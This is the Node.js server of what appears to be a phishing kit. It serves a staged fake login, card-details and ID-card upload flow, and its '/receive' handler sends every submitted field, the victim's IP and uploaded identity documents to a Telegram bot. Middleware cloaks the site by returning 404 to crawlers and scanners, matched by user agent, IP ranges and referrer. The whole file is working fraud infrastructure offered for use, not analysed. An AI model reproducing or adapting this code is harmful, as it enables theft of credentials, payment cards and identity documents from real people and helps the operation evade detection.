const express = require('express');
const formidable = require('formidable').default;
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const app = express();
const port = 3000;

// Middleware to parse incoming request bodies
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Define the views directory
const viewDir = path.join(__dirname, 'views');
const { botToken, chatId, Idcard } = require('./config/settings');

const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');

// Utility function to get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for'] || req.connection.remoteAddress;
}

// Bot detection functions
function isBotUA(userAgent) {
  if (!userAgent) {
    userAgent = '';
  }

  for (let i = 0; i < botUAList.length; i++) {
    if (userAgent.toLowerCase().includes(botUAList[i])) {
      return true;
    }
  }
  return false;
}

function isBotIP(ipAddress) {
  if (!ipAddress) {
    ipAddress = '';
  }

  if (ipAddress.substr(0, 7) === '::ffff:') {
    ipAddress = ipAddress.substr(7);
  }

  for (let i = 0; i < botIPList.length; i++) {
    if (ipAddress.includes(botIPList[i])) {
      return true;
    }
  }

  function IPtoNum(ip) {
    return Number(
      ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
    );
  }

  const inRange = botIPRangeList.some(
    ([min, max]) =>
      IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
  );

  if (inRange) {
    return true;
  }

  for (let i = 0; i < botIPCIDRRangeList.length; i++) {
    if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
      return true;
    }
  }

  for (let i = 0; i < botIPWildcardRangeList.length; i++) {
    if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
      return true;
    }
  }

  return false;
}

function isBotRef(referer) {
  if (!referer) {
    referer = '';
  }

  for (let i = 0; i < botRefList.length; i++) {
    if (referer.toLowerCase().includes(botRefList[i])) {
      return true;
    }
  }
  return false;
}

// Middleware for bot detection
app.use((req, res, next) => {
  const clientUA = req.headers['user-agent'] || req.get('user-agent');
  const clientIP = getClientIp(req);
  const clientRef = req.headers.referer || req.headers.origin;

  try {
    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
      console.log(`Blocked request: User-Agent: ${clientUA}, IP: ${clientIP}, Referrer: ${clientRef}`);
      return res.status(404).send('Not Found');
    } else {
      next();
    }
  } catch (error) {
    console.error('Error in bot detection middleware:', error);
    res.status(500).send('Internal Server Error');
  }
});

// Handle requests that end with a trailing slash
app.use((req, res, next) => {
  if (req.path.endsWith('/')) {
    return res.redirect('./Login');
  }
  next();
});

// Route for the "/Login" path
app.get('/Login', (req, res) => {
  const step = req.query.step;

  switch (step) {
    case '1':
      res.sendFile(path.join(viewDir, 'form.html'));
      break;
    case '2':
      res.sendFile(path.join(viewDir, 'card.html'));
      break;
    case '3':
      res.sendFile(path.join(viewDir, 'idcard.html'));
      break;
    default:
      res.sendFile(path.join(viewDir, 'login.html'));
      break;
  }
});

app.post('/receive', (req, res) => {
  const form = formidable({ multiples: true });

  form.parse(req, (err, fields, files) => {
    if (err) {
      res.status(500).send('An error occurred while processing the form.');
      return;
    }

    if (!Object.values(fields).some(value => value)) {
      res.status(400).send('Form submitted but all fields are empty!');
      return;
    }

    let message = '✅ SPL online\n\n';
    for (const [key, value] of Object.entries(fields)) {
      if (key !== 'visitor') {
        message += `${key}: ${value}\n`;
      }
    }

    const userIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    message += `🌍 ${userIP}\n`;
    message += `🕜 ${new Date().toLocaleString()}\n`;

    if (files.file && files.file.size > 0) {
      const filePath = files.file.filepath;
      const fileName = files.file.originalFilename;
      const fileType = files.file.mimetype;

      sendFileToTelegram(filePath, fileName, fileType, fields.visitor);
      res.json({ status: 'success', message: 'File sent to Telegram.' });
    } else {
      sendMessageToTelegram(message);
      res.json({ status: 'success', message: 'Message sent to Telegram.' });
    }
  });
});

function sendMessageToTelegram(message) {
  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

  axios.post(url, {
    chat_id: chatId,
    text: message,
    parse_mode: 'Markdown'
  }).catch(error => {
    console.error('Error sending message:', error);
  });
}

function sendFileToTelegram(filePath, fileName, fileType, visitor) {
  const url = `https://api.telegram.org/bot${botToken}/sendDocument`;
  const formData = {
    chat_id: chatId,
    document: {
      value: fs.createReadStream(filePath),
      options: {
        filename: fileName,
        contentType: fileType
      }
    },
    caption: `New ID card data received${visitor ? ' (' + visitor + ')' : ''}`
  };

  axios.post(url, formData, {
    headers: formData.getHeaders()
  }).then(() => {
    console.log('File sent successfully to Telegram.');
  }).catch(error => {
    console.error('Error sending file:', error);
  });
}

// Catch-all route for 404 errors
app.use((req, res) => {
  res.status(404).send('404 Not Found. The requested page does not exist.');
});

// Start the server
app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
}); 